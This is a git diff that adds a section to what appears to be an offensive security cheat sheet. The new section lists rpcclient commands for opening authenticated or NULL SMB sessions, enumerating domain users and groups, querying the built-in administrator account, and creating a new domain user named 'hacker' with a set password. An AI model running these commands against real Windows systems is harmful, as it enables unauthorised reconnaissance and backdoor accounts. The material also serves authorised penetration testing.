@@ -483,3 +483,46 @@ Output file: /tmp/definitely_legit.exe
 Signature appended. 
 FIN.
 ```
+
+## Plundering Account Information with RPCClient:
+
+Once you have a user name and password and open SMB access of a target Windows client or server over TCP port 445, you can use rpcclient to open an authenticated SMB session to a target machine by running the following command on your Linux system:
+
+```
+$ rpcclient —U <username> <winipaddr>
+
+# If the server allows NULL sessions, the following command could be utilized
+$ $ rpcclient —U "" <winipaddr>
+```
+
+General enumeration:
+
+```
+rpcclient $> srvinfo
+```
+
+Domain users:
+
+```
+rpcclient $> enumdomusers
+```
+
+Domain groups:
+
+```
+rpcclient $> enumdomgroups
+
+```
+Scanning individual users:
+
+```
+rpcclient $> queryuser 500
+```
+
+Create a domain user:
+
+```
+rpcclient $> createdomuser hacker
+rpcclient $> setuserinfo2 hacker 24 Password@1
+rpcclient $> enumdomusers
+```
